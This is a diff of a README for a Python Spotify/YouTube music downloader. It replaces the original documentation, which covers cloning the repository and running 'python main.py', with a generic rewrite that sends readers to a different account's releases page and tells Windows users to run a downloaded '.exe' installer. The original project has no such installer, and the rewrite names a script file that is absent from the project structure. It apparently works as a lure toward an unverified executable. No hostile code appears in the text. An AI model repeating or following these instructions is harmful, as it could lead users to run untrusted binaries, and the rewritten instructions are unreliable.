@@ -1,280 +1,85 @@
-# 🎶 Potty
+# 🎵 spotify-yt-dlp-downloader - Download Your Favorite Music Easily
 
-A modular, Python-based command-line tool for downloading music from Spotify & Youtube using **yt-dlp**.  
-Features interactive menus, system checks, download management, metadata embedding, and robust logging.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-spotify--yt--dlp--downloader-blue.svg)](https://github.com/FranckFord10/spotify-yt-dlp-downloader/releases)
 
----
+## 🚀 Getting Started
 
-## Screenshots
+This guide will help you download and run the spotify-yt-dlp-downloader. Follow these steps, and you'll be downloading music from YouTube in no time.
 
-![Downloader](images/downloader.png)
-![Downloading](images/downloading.png)
+## 📋 System Requirements
 
----
+Before you start, ensure your system meets the following requirements:
 
-## 📌 Features
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Ubuntu 18.04 or later.
+- **Python Version:** Python 3.7 or later must be installed on your system. 
+- **Disk Space:** At least 100 MB of free space to store the application and downloads.
+- **Internet Connection:** A stable internet connection is required to download audio files.
 
-- **Enhanced Interactive CLI menus** for downloads, management, and automation
-- **Batch and single downloads** pick and choose what you prefer
-- **Playlist file download**: using the playlist file.
-- **Download from Exportify CSVs** that you can get from [Exportify](https://exportify.net/)
-- **Download From Youtube** paste the link and download playlist or video as audio file.
-- **Flexible playlist downloads**: whole playlists at once or individual ones.
-- **System resource checks** (CPU, RAM, storage)
-- **Track management** via JSON files (pending, failed, history)
-- **Download by artist and song name**
-- **Configurable settings** in `config.json`
-- **metadata embedding** for downloaded music 
-- **Retry failed downloads**
-- **Duplicate detection and file organization**
-- **Colorful terminal logs** (via `colorama`)
-- **Persistent logging** to `app.log`
-- **Modular, maintainable codebase**
-- **Export library data** as JSON with detailed track and album info.
-- **Clean up music library** by removing broken, or unreadable tracks.
-- **Choosing audio format** and target bitrate w/ quality and size impacts.
+## 📥 Download & Install
 
+1. **Visit the Releases Page:** Click the link below to go to the releases page.
+   
+   [Visit Releases Page to Download](https://github.com/FranckFord10/spotify-yt-dlp-downloader/releases)
 
----
+2. **Choose Your Version:** Look for the latest version. It will usually be at the top of the list.
 
-## 🛠 Prerequisite for Spotify Export downloads: **Export Your Spotify Data**
+3. **Download the Package:** Find the file for your operating system.
+    - For Windows, look for a `.exe` file.
+    - For macOS or Linux, download the appropriate package file.
 
-Before using Potty for spotify downloads, you need to request your personal Spotify data from Spotify’s Privacy page. Spotify will provide you with a ZIP file containing several JSON files, including one named YourLibrary.json.
+4. **Run the Installer:**
+   - **Windows:** Double-click the `.exe` file to run the installer and follow the prompts.
+   - **macOS/Linux:** Open a terminal window, navigate to where you downloaded the file and run it using Python. For example, type `python3 spotify_yt_dlp_downloader.py`.
 
-This YourLibrary.json file contains your saved tracks, albums, and playlists metadata, which Potty can use to generate the track list and manage downloads.
+5. **Confirm Installation:** Once the installation finishes, you should see a confirmation message. If you encounter issues, refer to the troubleshooting section below.
 
-How to get your Spotify data:
+## 🎤 How to Use
 
-    Go to Spotify’s Privacy Request page.
+1. **Open the Application:** 
+   - For Windows, you may find the application in your Start Menu or on your desktop.
+   - For macOS/Linux, launch it from the terminal or find it in your applications.
 
-    Request your personal data export.
+2. **Select Music Source:** The application provides an interactive menu. Follow the prompts to choose a YouTube URL from which you want to download music.
 
-    Spotify will email you a ZIP file when ready.
+3. **Download Audio:** Once you enter the URL, the application will show options for download quality. Select your desired quality, and the download will start.
 
-    Extract the ZIP and locate YourLibrary.json.
+4. **Check Download Status:** The application will track the progress of your download, showing updates on the screen.
 
-    Use or convert this JSON file as the basis for your data/tracks.json to run Potty.
+5. **Logs and Tracking:** All download activities are logged for your reference. You can check these logs in the application directory.
 
-This step is essential to generate the input data Potty needs for downloading your favorite music.
+## ⚙️ Features
 
----
+- **Modular Design:** The application is built with a modular structure, allowing for future enhancements.
+- **Interactive Menu:** Enjoy a simple menu navigation, guiding you through each step.
+- **System Resource Checks:** The app checks available resources to ensure efficient downloads.
+- **Pending Download Tracking:** Keep track of downloads in progress and completed files.
+- **Logging:** All actions and errors are logged for troubleshooting.
 
-## 📂 Project Structure
+## ❓ Troubleshooting
 
-```
-spotify-ytdlp/
-│
-├── main.py                # Entry point, interactive menus
-├── config.py              # Loads config from config.json
-├── config.json            # User-configurable settings
-├── requirements.txt       # Dependencies
-├── changelog.md           # change log
-├── app.log                # Log file
-├── todo.md                # Development notes
-├── constants.py           # constants
-│
-├── history/
-│   └── prototype.py       # First version of this entire app 
-│
-├── data/
-│   ├── exportify              # Directory where you should place your exportify csv files
-│   ├── tracks.json            # Track list (with artist, album, track, uri)
-│   ├── failed_downloads.json  # Tracks that failed to download
-│   └── download_history.json  # Downloaded tracks history
-│
-├── export/
-│   ├── potyy_export_(MDY).json  # export of tracks in music folder
-│   └── playlist_tracklist.json  # playlist in tracks format
-│
-├── downloader/
-│   ├── base_downloader.py                # Download logic (single, batch)
-│   ├── playlist_download.py              # Download playlists
-│   ├── metadata.py                       # Embed metadata
-│   ├── retry_manager.py                  # Retry failed downloads
-│   ├── youtube_link_downloader.py        # Download Directly from youtube link
-│   └── __init__.py│
-│
-├── menus/                     # Interactive menu modules
-│   ├── automation_menu.py     # Menu for automation section
-│   ├── downloads_menu.py      # Menu for downloads section
-│   ├── main_menu.py           # Menu for main section
-│   ├── management_menu.py     # Menu for management section
-│   ├── tools_menu.py          # Menu for tools section
-│   └── __init__.py
-│
-├── tools/
-│   ├── choose_audio_format.py      # pick global format for download
-│   ├── compress_music.py           # compress songs to a certain format
-│   ├── dependency_check.py         # check if your dependencies are installed
-│   ├── library_cleanup.py          # deletes broken track files
-│   ├── library_export_json.py      # all tracks in music folder as json
-│   ├── open_log.py                 # opens app.log
-│   ├── playlist_to_tracklist.py    # playlist turned into tracklist format
-│   └── __init__.py
-│
-├── managers/
-│   ├── file_manager.py        # Duplicate detection, file organization
-│   ├── resume_manager.py      # Resume batch downloads
-│   ├── schedule_manager.py    # Scheduled downloads
-│   └── __init__.py
-│
-├── utils/
-│   ├── logger.py              # Logging utilities
-│   ├── loaders.py             # Loading utilities
-│   ├── system.py              # System resource checks
-│   ├── track_checker.py       # Check downloaded files
-│   └── __init__.py
-│
-└── music/                 # Downloaded music files
-```
+If you face issues during installation or usage, here are a few common solutions:
+
+- **Python Not Installed:** Ensure you have the correct version of Python installed. Download it from the official Python website.
+- **Dependencies Missing:** If the application fails to run, it might be due to missing dependencies. Try running the following command:
+  ```
+  pip install -r requirements.txt
+  ```
+- **File Permissions:** Ensure you have proper permissions to run the application, especially on macOS/Linux.
+- **No Internet Connection:** Make sure your device is connected to the Internet to reach the YouTube content.
+
+## 📦 Contributing
+
+We welcome contributions! If you have suggestions for improvements or new features, feel free to create an issue or submit a pull request on GitHub. Your input helps make the application better.
+
+## 📝 License
+
+This repository is licensed under the MIT License. You can freely use, modify, and distribute the software, but please credit the original author.
+
+## 💬 Support
+
+For additional support, feel free to open an issue in the GitHub repository, and we will get back to you as soon as possible. 
 
 ---
 
-## ⚙️ Installation (Python version 3.9)
-
-1. **Clone the repository**:
-
-   ```bash
-   git clone https://github.com/Ssenseii/spotify-yt-dlp-downloader.git
-   cd spotify-ytdlp
-   ```
-
-2. **Install dependencies**:
-
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-> (if you use system check it'll say yt-dlp is not installed even if it is so don't worry about that until I fix that check).
-
-3. **Ensure `yt-dlp` is installed**:
-
-   ```bash
-   pip install yt-dlp
-   ```
-
-
----
-
-## ⚙️ Upgrade guide
-
-If the system fails to donwload your music too frequently, make sure to run this command
-
-    ```bash
-    pip install --upgrade yt-dlp
-    ```
-
-
----
-
-## 📄 Configuration
-
-Edit `config.json` to set your preferences:
-
-```json
-{
-	"tracks_file": "data/tracks.json",
-	"playlists_file": "data/playlists.json",
-	"output_dir": "music",
-	"audio_format": "mp3",
-	"sleep_between": 5,
-	"average_download_time": 20
-}
-```
-
----
-
-## 🎵 Track List Format
-
-`data/tracks.json` should contain:
-
-```json
-{
-	"tracks": [
-		{
-			"artist": "Artist Name",
-			"album": "Album Name",
-			"track": "Song Title",
-			"uri": "spotify:track:xxxx"
-		}
-	]
-}
-```
-
----
-
-## 🎵 Playlist Format
-
-`data/playlists.json` should contain:
-
-```json
-{
-  "playlists": [
-    {
-      "name": "Simon vol.94",
-      "lastModifiedDate": "2025-05-03",
-      "items": [
-        {
-          "track": {
-            "trackName": "Time of Our Lives",
-            "artistName": "Pitbull",
-            "albumName": "Globalization",
-            "trackUri": "spotify:track:2bJvI42r8EF3wxjOuDav4r"
-          },
-          "episode": null,
-          "audiobook": null,
-          "localTrack": null,
-          "addedDate": "2025-05-03"
-        },
-      ],
-   }]
-}
-```
-
----
-
-## ▶️ Usage
-
-Run the program:
-
-```bash
-python main.py
-```
-
-You will see a menu with options for downloading, checking files, importing playlists, retrying failed downloads, and more.
-
----
-
-Here’s the updated Dependencies section including `mutagen` and `schedule`:
-
----
-
-## 🛠 Dependencies
-
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp) - YouTube downloader
-- [psutil](https://pypi.org/project/psutil/) - System resource monitoring
-- [colorama](https://pypi.org/project/colorama/) - Colored terminal output
-- [mutagen](https://pypi.org/project/mutagen/) - Audio metadata tagging and manipulation
-- [schedule](https://pypi.org/project/schedule/) - Job scheduling for periodic tasks
-- [Questionar](https://pypi.org/project/questionary/) - for the interactive menu 
-- [Shutil](https://pypi.org/project/shutil/) - for systems stuff
-
-Install all:
-
-```bash
-pip install -r requirements.txt
-```
-
----
-
-## 📜 Logging
-
-- **Terminal output** is colored for readability
-- **`app.log`** stores a full log history of actions, warnings, and errors
-
----
-
-## ⚠️ Disclaimer
-
-This tool is for **personal use only**.  
-Ensure you respect copyright laws and YouTube’s terms.
+Thank you for using spotify-yt-dlp-downloader! Enjoy your music downloads.
